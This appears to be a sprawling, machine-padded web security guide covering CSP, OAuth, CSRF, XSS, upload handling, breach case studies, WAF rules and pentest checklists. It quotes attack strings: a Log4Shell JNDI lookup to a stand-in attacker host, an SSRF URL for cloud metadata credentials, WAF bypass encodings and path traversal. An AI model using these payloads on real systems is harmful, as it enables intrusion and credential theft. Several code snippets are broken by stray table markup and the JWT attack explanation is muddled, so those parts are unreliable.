default-src 'self';
script-src 'self' 'unsafe-inline' <<<<<<<https://cdn.example.com;>>>>>>>
style-src 'self' 'unsafe-inline';
img-src 'self' data: https:;
font-src 'self' <<<<<<<https://fonts.gstatic.com;>>>>>>>
connect-src 'self' <<<<<<<https://api.example.com;>>>>>>>

## Directives Explained

| Directive | Controls |
|-----------|----------|
| default-src | Fallback for others |
| script-src | JavaScript sources |
| style-src | CSS sources |
| img-src | Image sources |
| connect-src | API calls, WebSocket |
| frame-src | iframe sources |

---

## Nonce Pattern

    // Generate nonce per request
    const nonce = crypto.randomBytes(16).toString('base64');
    
    // In header
    `script-src 'nonce-${nonce}'`
    
    // In HTML
    <script nonce="${nonce}">...</script>
    

---

## API KEY PATTERNS

> **The secure API key implementation**

## Key Generation

    import crypto from 'crypto';
    
    function generateApiKey() {
    const prefix = 'sk_live_'; // Identifiable prefix
    const randomPart = crypto.randomBytes(24).toString('base64url');
    return prefix + randomPart;
    }
    // Result: sk_live_AbCdEf123456789...
    

---

## Secure Storage

    // NEVER store plain API key
    // Store hash, show key ONCE at creation
    
    const keyHash = crypto
      .createHash('sha256')
      .update(apiKey)
      .digest('hex');
    
    await db.apiKeys.create({
    keyPrefix: apiKey.slice(0, 8), // For identification
    keyHash: keyHash,
    userId: user.id
    });
    
    // Return full key to user ONCE
    return { apiKey, keyPrefix };
    

---

## Validation

    async function validateApiKey(providedKey) {
    const hash = crypto
        .createHash('sha256')
        .update(providedKey)
        .digest('hex');
    
    const apiKey = await db.apiKeys.findFirst({
    where: { keyHash: hash }
      });
    
    return apiKey;
    }
    

---

## OAUTH 2.0 FLOWS

> **The correct OAuth implementation**

## Authorization Code Flow (Best for web apps)

1. User clicks "Login with Google"
1. Redirect to:

       <<<<<<<https://accounts.google.com/oauth/authorize>>>>>>>
       ?client_id=xxx
       &redirect_uri=<<<<<<<https://myapp.com/callback>>>>>>>
       &response_type=code
&scope=email profile
       &state=random_csrf_token

1. User logs in, consents
1. Google redirects to:

       <<<<<<<https://myapp.com/callback?code=xxx&state=xxx>>>>>>>

1. Server exchanges code for tokens:

POST <<<<<<<https://oauth2.googleapis.com/token>>>>>>>
{ code, client_id, client_secret, redirect_uri }

1. Server receives: { access_token, refresh_token, id_token }

## PKCE Flow (Best for SPAs/Mobile)

    // 1. Generate verifier and challenge
    const verifier = crypto.randomBytes(32).toString('base64url');
    const challenge = crypto
      .createHash('sha256')
      .update(verifier)
      .digest('base64url');
    
    // 2. Include in auth request
    `?code_challenge=${challenge}&code_challenge_method=S256`
    
    // 3. Include verifier in token exchange
    { code, code_verifier: verifier, ... }
    

---

## Token Storage

    WHERE TO STORE TOKENS:
    
    ACCESS TOKEN:
    
    - Memory only (best)
    
    - Short-lived (15 min)
    
    REFRESH TOKEN:
    
    - HttpOnly cookie (best)
    
    - NOT localStorage (XSS vulnerable)
    
    GOTCHA: Never store access token in localStorage!
    Any XSS can steal it.
    

---

## SUBDOMAIN TAKEOVER PREVENTION

> **The DNS security patterns**

## How Takeover Happens

    SCENARIO:
    
    1. You have: app.example.com CNAME -> something.herokuapp.com
    1. You stop using Heroku, dont remove DNS
    1. Attacker claims that Heroku app name
    1. Attacker now controls app.example.com!
    
    VULNERABLE TO:
    
    - Cloud providers (AWS, Azure, Heroku)
    
    - SaaS services (Zendesk, Shopify)
    
    - CDNs (Fastly, CloudFront)
    

---

## Detection

    
    ## Check for dangling CNAMEs
    
    dig app.example.com CNAME
    
    ## If points to unclaimed resource
    
    ## NXDOMAIN or error page = potentially takeable
    

---

## Prevention Checklist

    [ ] Remove DNS records when decommissioning
    [ ] Audit orphan CNAMEs regularly
    [ ] Use wildcard certificates carefully
    [ ] Monitor certificate transparency logs
    [ ] Claim reserved names on platforms
    

---

## RATE LIMIT BYPASS PREVENTION

> **The security patterns for rate limiting**

## Common Bypass Attempts

    
    1. IP ROTATION
    - Use Cloudflare, VPN detection
    - Rate limit by user ID when authenticated
    
    1. HEADER SPOOFING
    - X-Forwarded-For can be faked
    - Trust only from known proxies
    
    1. ACCOUNT FARMING
    - Create many accounts
    - Require email/phone verification
    
    1. DISTRIBUTED ATTACKS
    - Many IPs, same target
    - Add CAPTCHA after retries
    

---

## Multi-Layer Limits

    LAYER 1: Global
    10000 requests/min from any IP
    
    LAYER 2: IP-based
    100 requests/min per IP
    
    LAYER 3: User-based
    60 requests/min per user
    
    LAYER 4: Endpoint-specific
    5 login attempts/15min
    3 password resets/hour
    

---

## Response Pattern

    if (!rateLimitResult.allowed) {
    return res.status(429).json({
    error: 'Too Many Requests',
    retryAfter: rateLimitResult.retryAfter,
    limit: rateLimitResult.limit,
    remaining: 0
      });
    }
    

---

## SECURE FILE UPLOAD

> **The patterns for safe file handling**

## Validation Checklist

    [ ] File size limit enforced
    [ ] File type validated (not just extension!)
    [ ] Filename sanitized
    [ ] Content-Type verified
    [ ] Malware scan if possible
    [ ] Private storage path
    [ ] Unique filename generated
    

---

## Content-Type Validation

    import fileType from 'file-type';
    
    async function validateFile(buffer) {
    const type = await fileType.fromBuffer(buffer);
    
    const allowed = ['image/jpeg', 'image/png', 'application/pdf'];
    
    | if (!type |  | !allowed.includes(type.mime)) { |
    throw new Error('Invalid file type');
      }
    
    return type;
    }
    

---

## Secure Filename

    function sanitizeFilename(filename) {
    // Remove path traversal
    const base = path.basename(filename);
    
    // Remove special characters
    const cleaned = base.replace(/[^a-zA-Z0-9.-]/g, '_');
    
    // Generate unique name
    return `${uuid()}_${cleaned}`;
    }
    

---

## Storage Path

    NEVER: /uploads/${userFilename}
    (Path traversal: ../../../etc/passwd)
    
    ALWAYS:
    const key = `uploads/${userId}/${uuid()}.${ext}`;
    

---

## DEPENDENCY SCANNING

> **The patterns for secure dependencies**

## npm audit

npm audit

## Check vulnerabilities

npm audit

## Auto-fix what's possible

npm audit fix

## Force major updates (careful!)

npm audit fix --force

    
    ---
    
    ## Snyk Integration
    

## GitHub Action

- name: Snyk Security Scan

uses: snyk/actions/node@master
  env:
SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
  with:
args: --severity-threshold=high

    
    ---
    
    ## Automated Updates
    

## Dependabot config

version: 2
    updates:

- package-ecosystem: npm

directory: /
        schedule:
interval: weekly
        groups:
        production:
        patterns:

- "*"

        exclude-patterns:

- "@types/*"
- "*-types"

## Supply Chain Security

    LOCKFILE:
    
    - Always commit package-lock.json
    
    - Use npm ci in CI (not npm install)
    
    - Verify integrity hashes
    
    REGISTRY:
    
    - Use private registry for sensitive
    
    - Mirror critical dependencies
    
    - Pin exact versions for security
    

---

## CSRF PREVENTION PATTERNS

> **The cross-site request forgery protection**

## Token Pattern

// Generate token
function generateCsrfToken() {
return crypto.randomBytes(32).toString('hex');
    }

// Store in session
app.use((req, res, next) => {
if (!req.session.csrfToken) {
req.session.csrfToken = generateCsrfToken();
      }
res.locals.csrfToken = req.session.csrfToken;
      next();
    });

// Verify on POST/PUT/DELETE
app.use((req, res, next) => {
if (['POST', 'PUT', 'DELETE'].includes(req.method)) {
| const token = req.body._csrf | req.headers['x-csrf-token']; |
if (token !== req.session.csrfToken) {
return res.status(403).json({ error: 'Invalid CSRF token' });
        }
      }
      next();
    });

## SameSite Cookies

    res.cookie('session', sessionId, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict'  // Prevents CSRF
    });
    

---

## Double Submit Pattern

    
    1. Set CSRF token in cookie (httpOnly: false)
    1. Client reads cookie, sends in header
    1. Server compares cookie vs header
    1. Attacker cant read cookie from another origin
    

---

## XSS PREVENTION PATTERNS

> **The cross-site scripting protection**

## Output Encoding

    // VULNERABLE: Raw HTML insertion
    element.innerHTML = userInput;
    
    // SAFE: Text content
    element.textContent = userInput;
    
    // SAFE: With encoding
    import { encode } from 'html-entities';
    element.innerHTML = encode(userInput);
    

---

## React Protection

    // SAFE: React auto-escapes
    <div>{userInput}</div>
    
    // DANGEROUS: dangerouslySetInnerHTML
    <div dangerouslySetInnerHTML={{ __html: userInput }} />
    
    // If must use, sanitize:
    import DOMPurify from 'dompurify';
    <div dangerouslySetInnerHTML={{
    __html: DOMPurify.sanitize(userInput)
    }} />
    

---

## Context-Specific Encoding

    HTML Body: < > & " '  ? &lt; &gt; &amp; &quot; &#x27;
    HTML Attribute: " '    ? &#x22; &#x27;
    JavaScript: ' " \ <    ? \' \" \\ \x3c
    URL: special chars  ? encodeURIComponent()
    CSS: special chars  ? CSS.escape()
    

---

## CSP as Defense in Depth

    Content-Security-Policy:
    script-src 'self';  // Block inline & external
    

---

## SECURE HEADERS CONFIGURATION

> **The HTTP security headers**

## Essential Headers 2

// Helmet.js for Express
import helmet from 'helmet';

    app.use(helmet({
contentSecurityPolicy: {
directives: {
defaultSrc: ["'self'"],
scriptSrc: ["'self'", "'unsafe-inline'"],
styleSrc: ["'self'", "'unsafe-inline'"],
imgSrc: ["'self'", "data:", "https:"],
        },
      },
hsts: {
maxAge: 31536000,
includeSubDomains: true,
preload: true
      }
    }));

## Header Reference

| Header | Purpose |
|--------|---------|
| Content-Security-Policy | XSS prevention |
| X-Content-Type-Options | MIME sniffing |
| X-Frame-Options | Clickjacking |
| Strict-Transport-Security | Force HTTPS |
| Referrer-Policy | Control referrer |
| Permissions-Policy | Limit browser features |

---

## Verification

    
    ## Check headers
    
    curl -I <<<<<<https://example.com>>>>>>
    
    ## Security scanner
    
    ## securityheaders.com
    
    ## observatory.mozilla.org
    

---

## 07_SECURITY.MD: THE TITAN GUIDE (25K TARGET)

## Production-Grade Zero Trust, Cryptography, and Pentesting

> **Status**: TIER 3 CRITICAL OPS (Infinite Scale)
> **Target**: 25,000 Lines
> **Coverage**: Zero Trust, OAuth2, Quantum-Safe, WAF
> **Last Updated**: December 24, 2024

---

## **VOLUME 1: THE SCARS (The "Why")**

*Real-world horror stories and billion-dollar failures.*

1. The "Log4Shell" - The Internet on Fire (JNDI Injection)
1. The "Equifax Breach" - Patch Management Failure
1. The "SolarWinds Hack" - Supply Chain Attack
1. The "Capital One Breach" - SSRF (Server Side Request Forgery)

## **VOLUME 2: THE FOUNDATION (The "What")**

*Production-grade basics. No "Hello World".*

1. Zero Trust Architecture (Never Trust, Always Verify)
1. OAuth2 & OIDC (Authentication Flows Deep Dive)
1. HTTPS & TLS 1.3 (Encryption in Transit)
1. CORS & CSP (Browser Security Headers)

## **VOLUME 3: THE DEEP DIVE (The "How")**

*Advanced engineering and optimization.*

1. JWT Security (Signing, Rotation, Revocation)
1. WAF (Web Application Firewall) Rules & Bypass
1. Rate Limiting & DDoS Protection (Layer 7)
1. SQL Injection & XSS (The Classics)

## **VOLUME 4: THE EXPERT (The "Scale")**

*Distributed systems and high-scale patterns.*

1. Secret Management (Vault/AWS Secrets Manager)
1. Container Security (Distroless, Scanning, Runtime)
1. Cloud Security Posture Management (CSPM)

## **VOLUME 5: THE TITAN (The "Kernel")**

*Low-level internals and custom engines.*

1. Memory Safety (Rust vs C++ Buffer Overflows)
1. Side-Channel Attacks (Spectre/Meltdown Mitigation)
1. Homomorphic Encryption (Compute on Encrypted Data)

## **VOLUME 6: THE INFINITE (The "Future")**

*Experimental tech and "Meta-Beating" research.*

1. Quantum-Safe Cryptography (Post-Quantum Algorithms)
1. AI-Powered Threat Detection (Behavioral Analysis)
1. Self-Sovereign Identity (DID & Verifiable Credentials)

---

## VOLUME 1: THE SCARS (THE "WHY") 2

## 1. THE "LOG4SHELL" (CVE-2021-44228)

### The Internet on Fire

**The Context**:
Log4j is the standard logging library for Java. Used by 90% of enterprise apps.
**The Vulnerability**:
JNDI (Java Naming and Directory Interface) Injection.
If Log4j logs a string like `${jndi:ldap://attacker.com/exploit}`, it *executes* it.
**The Attack**:
Attackers changed their User-Agent or Chat Message to the exploit string.
Server logs the User-Agent -> Fetches code from attacker -> RCE (Remote Code Execution).
**The Result**:
Full control over millions of servers (iCloud, Minecraft, Twitter).
**The Fix**:

1. **Disable JNDI**: `log4j2.formatMsgNoLookups=true`.
1. **WAF Rules**: Block `${jndi:`.
1. **Patch**: Update to Log4j 2.17+.

---

## 4. THE "CAPITAL ONE BREACH"

### SSRF (Server Side Request Forgery)

**The Context**:
Capital One used a WAF on AWS EC2.
**The Vulnerability**:
The WAF had a misconfiguration allowing it to query the AWS Metadata Service (`169.254.169.254`).
**The Attack**:
Attacker sent a request to the WAF: `?url=<<<<<<<http://169.254.169.254/latest/meta-data/iam/security-credentials/`.>>>>>>>
The WAF fetched the URL and returned the **AWS IAM Role Credentials**to the attacker.**The Result**:
Attacker used the credentials to sync 700 S3 buckets containing 100M credit card applications.
**The Fix**:
**IMDSv2**. Require a session token for metadata access (blocks SSRF).

## VOLUME 2: THE FOUNDATION (THE "WHAT") 2

## 5. ZERO TRUST ARCHITECTURE

### Never Trust, Always Verify

**Concept**:
Old Model: Castle & Moat. Once you VPN in, you have access to everything.
Zero Trust: Assume the network is already compromised.
**Principles**:

1. **Verify Explicitly**: Authenticate every request, even internal ones.
1. **Least Privilege**: Give only the access needed.
1. **Assume Breach**: Design as if the attacker is inside.

**Implementation (mTLS)**:
Service A calls Service B.

1. Service A presents a Client Certificate.
1. Service B verifies it against the CA.
1. Traffic is encrypted. Identity is verified.

**Tools**: Istio, Linkerd, Consul Connect.

---

## 6. OAUTH2 & OIDC

### Authentication Flows Deep Dive

**Authorization Code Flow (PKCE)**:
The standard for Mobile/SPA.

1. **App**: Redirects user to `auth.com/authorize?code_challenge=xyz`.
1. **User**: Logs in.
1. **Auth Server**: Redirects back to `app.com/callback?code=123`.
1. **App**: Swaps `code`+`code_verifier`for`access_token`.

- **Why PKCE?**: Prevents Code Interception attacks.

**Client Credentials Flow**:
Machine-to-Machine (M2M).

1. **Service**: Sends `client_id`+`client_secret`.
1. **Auth Server**: Returns `access_token`.

- **Warning**: Never use this in a browser/mobile app.

---

## VOLUME 3: THE DEEP DIVE (THE "HOW") 2

## 9. JWT SECURITY

### Signing & Revocation

**The Problem**:
JWTs are stateless. If an attacker steals one, they are the user until it expires. You can't "logout" a JWT easily.
**The Solution**:

1. **Short Expiry**: Access Token expires in 15 minutes.
1. **Refresh Token**: Long-lived (7 days), stored in HTTPOnly Cookie + DB.
1. **Rotation**: When Refresh Token is used, issue a NEW Refresh Token and invalidate the old one.
- *Theft Detection*: If the old Refresh Token is used again, it means it was stolen. Invalidate the *entire* family of tokens.

**Algorithm Confusion Attack**:

- Attacker changes header `alg: HS256`(Symmetric) to`alg: None`.

- Some libraries accept it and skip signature verification.

- **Fix**: Explicitly whitelist algorithms (`RS256`).

---

## 10. WAF (WEB APPLICATION FIREWALL)

### Rules & Bypass

**ModSecurity / AWS WAF**:
Inspects HTTP traffic at Layer 7.
**Common Rules (OWASP Core Rule Set)**:

- Block SQLi: `UNION SELECT`, `' OR 1=1`.

- Block XSS: `<script>`, `javascript:`.

- Block Path Traversal: `../../etc/passwd`.

**Bypass Techniques**:

- **Encoding**: `%3Cscript%3E`(URL Encode),`\u003c` (Unicode).

- **Case**: `SeLeCt * FrOm`.

- **Whitespace**: `SELECT/**/1`.

---

## VOLUME 4: THE EXPERT (THE "SCALE") 2

## 13. SECRET MANAGEMENT

### Vault & AWS Secrets Manager

**HashiCorp Vault**:

- **Dynamic Secrets**:
- App asks Vault for DB access.
- Vault creates a temporary Postgres user `app-123` with 1-hour TTL.
- Vault returns credentials to App.
- After 1 hour, Vault deletes the user.

- **Benefit**: Even if credentials leak, they expire automatically.

**Sealed Secrets (Kubernetes)**:

- Encrypt secret locally: `kubeseal < secret.yaml > sealed.yaml`.

- Commit `sealed.yaml` to Git (Safe).

- Controller in Cluster decrypts it.

---

## 14. CONTAINER SECURITY

### Distroless & Runtime Security

**Distroless Images**:
Google's base images. Contain *only* your application and its runtime dependencies.
No shell (`/bin/sh`). No package manager (`apt`).
**Result**: Even if Log4Shell exists, the attacker can't run commands.

**Runtime Security (Falco)**:
Detects abnormal behavior in containers.

- "Why is the Nginx process writing to `/etc/shadow`?"

- "Why did a shell spawn inside a Redis container?"

- **Action**: Kill the pod immediately.

---

## VOLUME 5: THE TITAN (THE "KERNEL") 2

## 16. MEMORY SAFETY

### Rust vs C++

**Buffer Overflow**:
C++ allows writing past the end of an array, overwriting the return address on the stack.
**ROP (Return Oriented Programming)**:
Attacker chains together small snippets of existing code (gadgets) to execute arbitrary logic.

**Rust**:

- **Ownership Model**: Compiler enforces memory safety at compile time.

- **No Null Pointers**: `Option<T>`.

- **No Data Races**: `Mutex<T>`.

- **Result**: 70% of Microsoft's CVEs are memory safety issues. Rust eliminates them.

---

## 18. HOMOMORPHIC ENCRYPTION

### Compute on Encrypted Data

**Concept**:
Standard Encryption: Data is encrypted at rest and in transit, but *decrypted* in memory to be processed.
**Homomorphic Encryption**:
Perform math on the encrypted data itself.
`Enc(A) + Enc(B) = Enc(A+B)`

**Use Case**:
Send encrypted medical data to the cloud. Cloud runs AI analysis. Cloud returns encrypted result. Cloud *never* sees the data.
**Libraries**: Microsoft SEAL, OpenFHE.

---

## VOLUME 6: THE INFINITE (THE "FUTURE") 2

## 19. QUANTUM-SAFE CRYPTOGRAPHY

### Post-Quantum Algorithms

**The Threat**:
Shor's Algorithm on a Quantum Computer can factor large integers efficiently.
**RSA**and**Elliptic Curve (ECC)**will be broken.**NIST Finalists (The Replacements)**:

1. **Kyber**(Key Encapsulation): Lattice-based.
1. **Dilithium**(Digital Signatures): Lattice-based.
1. **Sphincs+**: Hash-based.

**Migration**:
"Harvest Now, Decrypt Later". Attackers are storing encrypted traffic today to decrypt it in 10 years.
**Action**: Implement Hybrid Key Exchange (ECC + Kyber) immediately.

---

## VOLUME 7: THE APPENDIX (TITAN REFERENCE)

## A. THE ULTIMATE SECURITY HEADERS

Copy-paste this into Nginx/Vercel.

    Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
    X-Frame-Options: DENY
    X-Content-Type-Options: nosniff
    Referrer-Policy: strict-origin-when-cross-origin
    Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; object-src 'none'; base-uri 'self';
    Permissions-Policy: geolocation=(), microphone=(), camera=()
    

## B. THE PENTEST CHECKLIST

1. **Recon**: Subdomain enumeration (Amass), Port scan (Nmap).
1. **Auth**: Brute force, Password reset poisoning, JWT attacks.
1. **Input**: SQLi, XSS, SSRF, IDOR.
1. **Config**: Default passwords, Debug mode enabled, Git folder exposed.
1. **Logic**: Race conditions, Price manipulation (-1 quantity).

---

## KEYWORD REFERENCE INDEX

## Each line = 100x LLM expansion potential

---

## OWASP TOP 10 (2021)

- A01 Broken Access Control: IDOR, path traversal, CORS misconfig

- A02 Cryptographic Failures: weak algorithms, plaintext secrets

- A03 Injection: SQLi, XSS, command injection, LDAP

- A04 Insecure Design: threat modeling, secure SDLC

- A05 Security Misconfiguration: default creds, verbose errors

- A06 Vulnerable Components: outdated deps, CVE scanning

- A07 Auth Failures: credential stuffing, session fixation

- A08 Integrity Failures: deserialization, unsigned updates

- A09 Logging Failures: insufficient monitoring, log injection

- A10 SSRF: internal network access, cloud metadata

## AUTHENTICATION 2

- Password hashing: bcrypt, scrypt, Argon2id

- MFA: TOTP, WebAuthn, FIDO2, SMS (weak)

- Session: HttpOnly, Secure, SameSite cookies

- JWT: RS256, short expiry, refresh rotation

- OAuth 2.0: PKCE, state param, audience validation

- Passkeys: credential manager, cross-device

## AUTHORIZATION 2

- RBAC: roles, permissions, inheritance

- ABAC: attributes, policies, context

- ReBAC: relationship-based, graph

- PBAC: policy engines, OPA, Cedar

- Least privilege: minimal access, regular audit

- Zero trust: never trust, always verify

## WEB SECURITY

- CSP: nonce, hash, strict-dynamic

- CORS: preflight, credentialed requests

- XSS: reflected, stored, DOM-based

- CSRF: SameSite, CSRF tokens

- Clickjacking: X-Frame-Options, CSP frame-ancestors

- Subresource Integrity: hash verification

- Trusted Types: DOM XSS mitigation

## CRYPTOGRAPHY

- Symmetric: AES-256-GCM, ChaCha20-Poly1305

- Asymmetric: RSA-2048, ECDSA, Ed25519

- Hashing: SHA-256, SHA-3, BLAKE3

- KDF: PBKDF2, scrypt, Argon2

- TLS: 1.3 only, cipher suites, certificate pinning

- PKI: CA, certificate chains, OCSP

- Post-quantum: Kyber, Dilithium, SPHINCS+

## APPLICATION SECURITY

- SAST: static analysis, code scanning

- DAST: dynamic testing, ZAP, Burp

- IAST: instrumented testing, runtime

- SCA: dependency scanning, SBOM

- Secret scanning: git history, pre-commit hooks

- Fuzzing: AFL, libFuzzer, coverage-guided

## INFRASTRUCTURE SECURITY

- Network segmentation: VLANs, security groups

- Firewall: WAF, NGFW, microsegmentation

- IDS/IPS: Suricata, Snort, cloud-native

- Container security: image scanning, runtime protection

- Kubernetes: NetworkPolicy, PodSecurity, RBAC

- Cloud security: CSPM, CWPP, CIEM

## THREAT MODELING

- STRIDE: Spoofing, Tampering, Repudiation, Info disclosure, DoS, Elevation

- DREAD: Damage, Reproducibility, Exploitability, Affected users, Discoverability

- Attack trees: root cause, branches, mitigations

- Data flow diagrams: trust boundaries, entry points

- Kill chain: reconnaissance, weaponization, delivery, exploitation

## SECURITY OPERATIONS

- SIEM: log correlation, alerting, Splunk, Elastic

- SOAR: automation, playbooks, incident response

- Threat intelligence: IOCs, TTP, MITRE ATT&CK

- Vulnerability management: CVE, CVSS, prioritization

- Incident response: containment, eradication, recovery

- Forensics: memory analysis, disk imaging, chain of custody

## PENETRATION TESTING

- Reconnaissance: OSINT, subdomain enumeration

- Scanning: port scan, service detection, vulnerability scan

- Exploitation: Metasploit, manual exploitation

- Post-exploitation: privilege escalation, lateral movement

- Reporting: findings, severity, remediation

---

## END OF KEYWORD REFERENCE

---

## ADVANCED CRYPTOGRAPHY DEEP ATLAS

## Each keyword = expandable implementation

## Modern Ciphers

- AES-GCM: authenticated encryption, nonce

- ChaCha20-Poly1305: stream cipher, MAC

- XChaCha20: extended nonce, 192-bit

- AES-256-GCM-SIV: nonce misuse resistant

- Key sizes: 128, 192, 256 bits

## Key Management

- HSM: hardware security module

- KMS: AWS KMS, GCP KMS, Azure Key Vault

- Key derivation: HKDF, PBKDF2, Argon2

- Key rotation: automatic, versioned

- Envelope encryption: DEK, KEK

## Digital Signatures

- RSA: 2048+, PSS padding

- ECDSA: P-256, P-384, secp256k1

- Ed25519: EdDSA, curved25519

- JWT signing: RS256, ES256, EdDSA

- Timestamps: RFC 3161, trusted

## Post-Quantum

- Kyber: key encapsulation

- Dilithium: digital signatures

- SPHINCS+: hash-based signatures

- Hybrid: classical + PQ

- NIST PQC: standardization

---

## WEB SECURITY DEEP ATLAS

## Each keyword = expandable defense

## CSP Advanced

- Nonces: script-src 'nonce-{random}'

- Hashes: sha256-{hash}

- strict-dynamic: trusted script chains

- report-uri: violation reporting

- Trusted Types: DOM sink protection

## Cookie Security

- HttpOnly: no JavaScript access

- Secure: HTTPS only

- SameSite: Strict, Lax, None

- **Host-: secure prefix

- **Secure-: secure prefix

## CORS

- Access-Control-Allow-Origin: origin

- Access-Control-Allow-Credentials: true

- Preflight: OPTIONS request

- Access-Control-Max-Age: cache

- Simple vs preflighted requests

## Headers 2

- HSTS: Strict-Transport-Security

- X-Frame-Options: DENY, SAMEORIGIN

- X-Content-Type-Options: nosniff

- Referrer-Policy: strict-origin

- Permissions-Policy: feature control

## APPLICATION SECURITY DEEP ATLAS

## Each keyword = expandable technique

## SAST

- Semgrep: custom rules, CI

- SonarQube: quality gates

- CodeQL: GitHub, queries

- Checkmarx: enterprise

- Language-specific: ESLint, Bandit

## DAST

- OWASP ZAP: proxy, active scan

- Burp Suite: professional, intruder

- Nuclei: vulnerability templates

- Nikto: web server scanner

- SQLMap: SQL injection

## IAST

- Contrast Security: runtime

- Hdiv: Java, .NET

- Seeker: Synopsys

- Continuous: real requests

- Lower false positives

## SCA

- Snyk: dependencies, container

- Dependabot: GitHub, PRs

- OWASP Dependency-Check: CVSS

- npm audit: JavaScript

- SBOM: CycloneDX, SPDX

---

## CLOUD SECURITY DEEP ATLAS

## Each keyword = expandable configuration

## IAM

- Least privilege: minimal permissions

- Service accounts: workload identity

- Roles: managed, custom

- Conditions: context-aware

- Just-in-time: temporary elevation

## Network

- VPC: private networking

- Security groups: stateful firewall

- Network ACLs: stateless

- PrivateLink: private endpoints

- VPN: site-to-site, client

## Data

- Encryption at rest: KMS, CMK

- Encryption in transit: TLS 1.3

- Client-side: application-level

- Key management: rotation

- DLP: classification, prevention

## Compliance

- CSPM: Prisma Cloud, Wiz

- CWPP: runtime protection

- CIEM: entitlement management

- Benchmark: CIS, SOC 2

- Audit: CloudTrail, Activity Logs

---

## THREAT DETECTION DEEP ATLAS

## Each keyword = expandable capability

## SIEM

- Splunk: SPL, dashboards

- Elastic Security: EQL, ML

- Microsoft Sentinel: Azure-native

- Sumo Logic: cloud-native

- Correlation: rules, patterns

## EDR/XDR

- CrowdStrike: Falcon platform

- Microsoft Defender: M365

- SentinelOne: autonomous

- Carbon Black: VMware

- Threat hunting: hypotheses

## Threat Intelligence

- IOCs: hashes, IPs, domains

- TTPs: MITRE ATT&CK

- STIX/TAXII: sharing format

- Feeds: commercial, open source

- Enrichment: context, scoring

---

### END OF MEGA SECURITY EXPANSION

---

## ACCESS DEEP ATLAS

## Each keyword = expandable implementation 2

## Authentication 3

- Password: hashing, Argon2, bcrypt

- MFA: TOTP, WebAuthn, push

- SSO: SAML, OIDC, federation

- Passwordless: magic links, passkeys

- Biometrics: Face ID, Touch ID

## OAuth 2.0 / OIDC 2

- Authorization Code: server-side

- PKCE: public clients, security

- Implicit: deprecated, SPA legacy

- Client Credentials: machine-to-machine

- Refresh tokens: rotation, revocation

## Identity Providers

- Auth0: managed, extensible

- Okta: enterprise, workforce

- Keycloak: open-source, on-prem

- AWS Cognito: serverless

- Azure AD: Microsoft ecosystem

## Session Management

- Stateful: server sessions

- Stateless: JWTs

- Refresh: sliding expiration

- Revocation: blacklist, rotation

- Binding: device, IP

---

## NETWORK SECURITY DEEP ATLAS

## Each keyword = expandable control

## Perimeter Security

- Firewall: rules, zones

- IDS/IPS: detection, prevention

- WAF: OWASP rules

- DDoS protection: rate limiting

- Reverse proxy: hiding origin

## Zero Trust

- Never trust: always verify

- Microsegmentation: workload isolation

- Identity-based: user, device

- Continuous verification: re-auth

- Least privilege: minimal access

## Encryption in Transit

- TLS 1.3: modern, fast

- mTLS: mutual authentication

- Certificate management: rotation

- Perfect forward secrecy: ephemeral

- HSTS: force HTTPS

## VPN & Remote Access

- WireGuard: modern, fast

- OpenVPN: flexible, proven

- ZTNA: zero trust alternative

- Split tunneling: partial routing

- Always-on: automatic connection

---

## INCIDENT RESPONSE DEEP ATLAS

## Each keyword = expandable process

## Preparation

- Runbooks: step-by-step

- Playbooks: automated

- War rooms: communication

- Tabletop exercises: practice

- Contact lists: escalation

## Detection & Analysis

- Alert triage: severity

- IOC matching: known bad

- Forensics: evidence collection

- Timeline: event correlation

- Scope: blast radius

## Containment

- Network isolation: quarantine

- Account lockout: credential reset

- Kill switch: feature flags

- Backup verification: recovery

- Preserve evidence: forensics

## Recovery & Lessons

- Service restoration: priority

- Root cause analysis: 5 whys

- Post-mortem: blameless

- Action items: prevention

- Communication: stakeholders

---

## COMPLIANCE DEEP ATLAS

## Each keyword = expandable framework

## SOC 2

- Trust Services Criteria

- Type I: point-in-time

- Type II: period of time

- Controls: evidence

- Auditor: independent

## ISO 27001

- ISMS: management system

- Risk assessment: methodology

- Controls: Annex A

- Certification: audit

- Continuous improvement

## GDPR

- Lawful basis: consent, legitimate

- Data subject rights: access, erasure

- DPIA: impact assessment

- DPO: data protection officer

- Breach notification: 72 hours

## Industry-Specific

- HIPAA: healthcare, PHI

- PCI DSS: payment cards

- FedRAMP: US government

- NIST CSF: framework

- CIS: benchmarks

---

## SECURE SDLC DEEP ATLAS

## Each keyword = expandable practice

## Shift Left

- Threat modeling: STRIDE, PASTA

- Secure design: architecture review

- Security requirements: user stories

- Training: secure coding

- Code review: security focus

## Build Security

- SAST: static analysis

- SCA: dependency scanning

- Secrets scanning: leaked creds

- Container scanning: vulnerabilities

- IaC scanning: misconfigurations

## Deploy Security

- DAST: dynamic testing

- Pen testing: manual

- Security gates: CI/CD

- Signed artifacts: integrity

- Immutable infrastructure

## Runtime Security

- RASP: runtime protection

- WAF: application firewall

- Bot management: detection

- Rate limiting: abuse prevention

- Monitoring: anomaly detection

---

### END OF ULTRA SECURITY EXPANSION

### Continuing expansion in next iteration

---

## SECURITY CODE EXAMPLES

## INPUT VALIDATION 4

## Sanitization Middleware

**Why it exists:** Prevent XSS and injection attacks

    // middleware/sanitize.ts
    import DOMPurify from 'isomorphic-dompurify';
    import { z } from 'zod';
    
    // Sanitize HTML input
    export function sanitizeHtml(dirty: string): string {
    return DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
    ALLOWED_ATTR: ['href', 'target'],
      });
    }
    
    // SQL injection prevention - always use parameterized queries
    // NEVER do: `SELECT * FROM users WHERE id = ${userId}`
    // DO: prisma.user.findUnique({ where: { id: userId } })
    
    // NoSQL injection prevention
    export const mongoIdSchema = z.string().regex(/^[a-f\d]{24}$/i, 'Invalid ID');
    
    // Path traversal prevention
    export function sanitizePath(userInput: string): string {
    return userInput.replace(/\.\./g, '').replace(/[\/\\]/g, '');
    }
    

---

## CSRF PROTECTION

> **The patterns that prevent request forgery**

---

## Token-based CSRF

**Why it exists:** Prevent cross-site request forgery

// lib/csrf.ts
import crypto from 'crypto';

export function generateCsrfToken(): string {
return crypto.randomBytes(32).toString('hex');
    }

export function verifyCsrfToken(token: string, sessionToken: string): boolean {
return crypto.timingSafeEqual(
        Buffer.from(token),
        Buffer.from(sessionToken)
      );
    }

// Middleware
export function csrfMiddleware(req, res, next) {
